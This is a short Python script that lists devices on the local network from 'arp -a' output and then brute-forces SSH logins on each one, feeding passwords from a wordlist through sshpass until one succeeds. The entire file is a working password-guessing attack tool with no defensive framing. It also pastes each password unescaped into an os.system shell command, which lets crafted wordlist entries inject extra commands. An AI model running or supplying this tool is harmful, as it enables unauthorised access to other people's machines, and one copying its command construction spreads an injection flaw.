import os
import subprocess

def scan_network():
    # Perform a LAN scan to discover active devices
    scan_result = subprocess.check_output(['arp', '-a']).decode('utf-8')
    devices = []
    
    # Extract IP addresses from the scan result
    for line in scan_result.splitlines():
        if 'ether' in line:
            ip_address = line.split('(')[1].split(')')[0]
            devices.append(ip_address)
    
    return devices

def brute_force_passwords(devices, password_file):
    # Iterate through the list of devices
    for device in devices:
        # Try each password from the password file
        with open(password_file, 'r') as file:
            for password in file:
                password = password.strip()
                command = f'sshpass -p {password} ssh user@{device} -o ConnectTimeout=1'
                
                # Attempt to connect to the device using SSH
                result = os.system(command)
                
                # If the connection is successful, print the password and exit
                if result == 0:
                    print(f'Password found: {password}')
                    return
    
    print('Password not found')

# Usage
devices = scan_network()
password_file = 'passwords.txt'
brute_force_passwords(devices, password_file)
